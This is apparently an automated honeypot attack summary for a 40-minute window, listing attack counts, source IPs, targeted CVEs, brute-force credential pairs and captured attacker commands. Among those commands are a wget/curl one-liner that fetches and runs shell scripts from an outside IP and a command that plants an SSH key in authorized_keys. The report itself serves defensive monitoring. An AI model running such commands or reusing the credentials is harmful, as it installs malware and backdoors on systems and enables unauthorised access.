**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-09T13:01:29Z
*   **Timeframe Covered:** 2025-10-09T12:20:01Z to 2025-10-09T13:00:01Z
*   **Log Files:**
    *   `agg_log_20251009T122001Z.json`
    *   `agg_log_20251009T124001Z.json`
    *   `agg_log_20251009T130001Z.json`

**Executive Summary**

This report summarizes 18,707 events collected from the honeypot network over a 40-minute period. The majority of attacks targeted the Cowrie honeypot, indicating a high volume of SSH and Telnet-based threats. The most prominent attacking IP is `167.250.224.25`, responsible for a significant portion of the malicious traffic. A variety of CVEs were targeted, with a focus on remote code execution vulnerabilities. Attackers attempted numerous commands, primarily aimed at reconnaissance and establishing persistent access.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Cowrie: 10867
    *   Honeytrap: 2630
    *   Suricata: 1899
    *   Ciscoasa: 1756
    *   Sentrypeer: 659
    *   Mailoney: 417
    *   Dionaea: 40
    *   ConPot: 27
    *   Redishoneypot: 21
    *   H0neytr4p: 17
    *   Tanner: 19
    *   Honeyaml: 14
    *   ElasticPot: 6
    *   Adbhoney: 5
    *   Dicompot: 4

*   **Top Attacking IPs:**
    *   167.250.224.25: 3542
    *   4.144.169.44: 1245
    *   86.54.42.238: 770
    *   80.94.95.238: 729
    *   78.31.71.38: 618
    *   217.154.26.208: 328
    *   190.129.122.185: 263
    *   41.93.28.23: 228
    *   103.186.0.79: 243
    *   88.210.63.16: 253
    *   151.95.223.48: 248
    *   156.54.108.185: 174
    *   189.126.4.42: 258
    *   102.132.245.209: 214
    *   51.255.175.118: 219
    *   103.189.235.188: 214
    *   162.240.109.153: 208
    *   45.190.24.67: 169
    *   20.91.250.177: 188
    *   156.227.235.133: 173

*   **Top Targeted Ports/Protocols:**
    *   22: 1727
    *   25: 837
    *   5060: 659
    *   5903: 204
    *   8333: 136
    *   TCP/22: 127
    *   5901: 81
    *   UDP/5060: 66
    *   49156: 25
    *   49157: 24
    *   49158: 32
    *   5907: 49
    *   5908: 49
    *   5909: 48
    *   TCP/443: 18
    *   80: 21
    *   TCP/80: 11
    *   23: 43
    *   10250: 49
    *   6379: 12

*   **Most Common CVEs:**
    *   CVE-2021-3449
    *   CVE-2019-11500
    *   CVE-2002-0013
    *   CVE-2002-0012
    *   CVE-2006-2369
    *   CVE-2021-35394
    *   CVE-2005-4050
    *   CVE-1999-0183
    *   CVE-1999-0517
    *   CVE-2019-12263
    *   CVE-2019-12261
    *   CVE-2019-12260
    *   CVE-2019-12255

*   **Commands Attempted by Attackers:**
    *   `uname -a`
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys ...`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `Enter new UNIX password:`
    *   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
    *   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
    *   `ls -lh $(which ls)`
    *   `which ls`
    *   `crontab -l`
    *   `w`
    *   `uname -m`
    *   `cat /proc/cpuinfo | grep model | grep name | wc -l`
    *   `top`
    *   `uname`
    *   `whoami`
    *   `lscpu | grep Model`
    *   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
    *   `cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh; curl http://141.98.10.66/bins/c.sh; sh c.sh`

*   **Signatures Triggered:**
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port
    *   ET DROP Dshield Block Listed Source group 1
    *   ET SCAN NMAP -sS window 1024
    *   ET SCAN Potential SSH Scan
    *   ET HUNTING RDP Authentication Bypass Attempt
    *   ET INFO Reserved Internal IP Traffic
    *   ET CINS Active Threat Intelligence Poor Reputation IP
    *   ET VOIP Modified Sipvicious Asterisk PBX User-Agent
    *   ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
    *   ET DROP Spamhaus DROP Listed Traffic Inbound

*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34
    *   default/test
    *   guest/letmein
    *   frappe/frappe!
    *   root/Asterisk.2024
    *   root/Asterisk.2025
    *   root/Asterisk.321
    *   root/Asterisk123
    *   config/config11
    *   ubnt/ubnt12
    *   supervisor/P@ssw0rd
    *   root/Callcenter!123456
    *   user/135791
    *   root/qwerty123456
    *   root/IPBX@12345
    *   app/app

*   **Files Uploaded/Downloaded:**
    *   parm;
    *   parm5;
    *   parm6;
    *   parm7;
    *   psh4;
    *   parc;
    *   pmips;
    *   pmipsel;
    *   psparc;
    *   px86_64;
    *   pi686;
    *   pi586;
    *   w.sh;
    *   c.sh;
    *   botx.mpsl;
    *   11
    *   fonts.gstatic.com
    *   css?family=Libre+Franklin...
    *   ie8.css?ver=1.0
    *   html5.js?ver=3.7.3

*   **HTTP User-Agents:**
    *   *None observed*

*   **SSH Clients and Servers:**
    *   **Clients:** *None observed*
    *   **Servers:** *None observed*

*   **Top Attacker AS Organizations:**
    *   *None observed*

**Key Observations and Anomalies**

*   The attacker at `167.250.224.25` is highly active and persistent, suggesting a targeted or automated campaign.
*   The overwhelming number of Cowrie events indicates that SSH/Telnet brute-forcing and command execution attempts are the most prevalent attack vectors.
*   A significant number of commands are geared towards system reconnaissance, likely to tailor further attacks or malware deployment.
*   The attempt to download and execute shell scripts (`w.sh`, `c.sh`) from `141.98.10.66` indicates an attempt to install malware or backdoors.
*   The presence of various CVEs suggests that attackers are scanning for a wide range of unpatched vulnerabilities.

This concludes the Honeypot Attack Summary Report. Continued monitoring is recommended.